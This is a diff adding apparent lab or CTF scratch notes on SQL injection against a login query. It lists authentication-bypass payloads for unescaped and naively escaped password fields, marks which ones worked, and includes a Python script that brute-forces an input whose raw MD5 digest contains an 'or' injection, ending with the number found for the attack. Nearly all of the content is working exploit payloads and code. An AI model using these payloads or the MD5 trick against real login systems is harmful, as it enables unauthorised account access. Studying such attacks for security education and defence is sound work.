@@ -1,0 +1,112 @@
+select * from users where username='victim' AND
+passsword=''
+---------------------------------------------
+
+No defenses
+-----------
+select * from users where username='victim' AND
+password='' or '1'='1'
+
+select * from users where username='victim' AND
+password='' or '1=1'
+
+Simple Escaping
+---------------
+select * from users where username='victim' AND
+password=''' OR 1=1#' (Didn't work)
+
+select * from users where username='victim' AND
+password='\'' OR 1=1#' (Didn't work)
+
+
+select * from users where username='victim' AND
+password='\'or\'1\'=\'1'
+
+select * from users where username='victim' AND
+password=''' or ''1''=''1'
+
+select * from users where username='victim' AND
+password=''' or ''1=1' 
+
+elect * from users where username='victim' AND
+password='' or '1'='1'
+
+elect * from users where username="victim";--" AND
+password=""or"1=1"
+
+select * from users where username='victim' AND
+password='\'' --> Not working
+
+         '\''' interpreted as ''''
+		 
+		                       ''
+
+		 
+		 '\'''  -->  '\''''' interpreted as ''''''
+
+
+		 '' or '1=1' ==> ' '' or ''1=1'
+		 '\' or \'1=1' ==> ' \'' or \''1=1' == ' '' or ''1=1'
+		 
+		 python\' or 1=1#
+		 python\' or 1=1#
+		 
+		 
+		
+		 ' OR 1=1# --> ''' OR 1=1#' (INCORRECT U & P)
+		 \' OR 1=1# --> \'' OR 1=1#  (WORKS!!)
+		 
+----------------------------------------------------------------------------------------------------------------
+129581926211651571912466741651878684928 
+216764374413955357708693809158795164850
+7325250812552113000555477135989021179
+
+Found a match to 'or' :  d,���!Ѫ'oR'9s�
+Search over!Took %s seconds 11143.929837
+Lets attack with:  280819239142210339874665159701566844556
+
+
+'''
+md5_str is the test string which is passed from below
+hashlib library is used to calculate md5 using md5.digest()
+
+'''
+from hashlib import md5
+import os
+
+def check_md5_str(md5_str):
+    # find() will return -1 if not found
+    pos1 = md5_str.find("'||'")
+    pos2 = md5_str.lower().find("'or'")
+    # if found and a char after the string exists and is a digit 1-9
+    if pos1 >= 0 and pos1+4 < len(md5_str) and md5_str[pos1+4].isdigit():
+        if int(md5_str[pos1+4]) > 0:
+            print md5_str
+            return True
+    if pos2 >= 0 and pos2+4 < len(md5_str) and md5_str[pos2+4].isdigit():
+        if int(md5_str[pos2+4]) > 0:
+            print md5_str
+            return True
+    return False
+
+found = True
+while found:
+    random_str = os.urandom(16).encode('hex')
+    i = int(random_str, 16)
+    print "new random_str: ", i
+    while True:
+        if((i%10000000) == 0):
+            print i
+        attack_str = str(i)
+        md5_str = md5(attack_str).digest()
+        i = i+1
+        if((i%100000000) == 0):
+            break # change to a new random string
+        if(check_md5_str(md5_str)):
+            found = False
+            break
+
+print "attack_str found: ", attack_str
+
+----------------------------------------------------------------------------------------------------------------
+		 
